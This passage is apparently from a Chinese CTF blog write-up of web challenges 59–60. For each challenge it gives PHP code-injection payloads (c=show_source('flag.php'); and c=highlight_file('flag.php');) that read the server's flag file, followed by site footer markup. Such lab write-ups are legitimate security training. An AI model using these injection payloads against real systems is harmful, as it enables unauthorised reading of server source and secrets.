+<p>使用 show_source 或者 highlight_file，构造 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=highlight_file(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/13/web53-60/file-20250313154353270.png"></p>
+<p><img src="/2025/03/13/web53-60/file-20250313154444430.png"></p>
+<h3 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h3><p>开启容器<br>一样的前端</p>
+<p><img src="/2025/03/13/web53-60/file-20250313154555902.png"></p>
+<p>与上题一样</p>
+<p>使用 show_source 或者 highlight_file，构造 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=highlight_file(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/13/web53-60/file-20250313154720666.png"></p>
+<h3 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h3><p>开启容器</p>
+<p><img src="/2025/03/13/web53-60/file-20250313154831648.png"></p>
+<p>使用 show_source 或者 highlight_file，构造 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=highlight_file(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web53"><span class="toc-number">1.</span> <span class="toc-text">web53</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%A8%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">辨析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web54"><span class="toc-number">2.</span> <span class="toc-text">web54</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web55"><span class="toc-number">3.</span> <span class="toc-text">web55</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web56"><span class="toc-number">4.</span> <span class="toc-text">web56</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web57"><span class="toc-number">5.</span> <span class="toc-text">web57</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web58"><span class="toc-number">6.</span> <span class="toc-text">web58</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web59"><span class="toc-number">7.</span> <span class="toc-text">web59</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web60"><span class="toc-number">8.</span> <span class="toc-text">web60</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://youngking-gfy.github.io/2025/03/13/web53-60/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&text=web53-60"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&title=web53-60"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&is_video=false&description=web53-60"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web53-60&body=Check out this article: https://youngking-gfy.github.io/2025/03/13/web53-60/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&title=web53-60"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&title=web53-60"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&title=web53-60"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&title=web53-60"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://youngking-gfy.github.io/2025/03/13/web53-60/&name=web53-60&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://youngking-gfy.github.io/2025/03/13/web53-60/&t=web53-60"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Y0ungK1ng
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
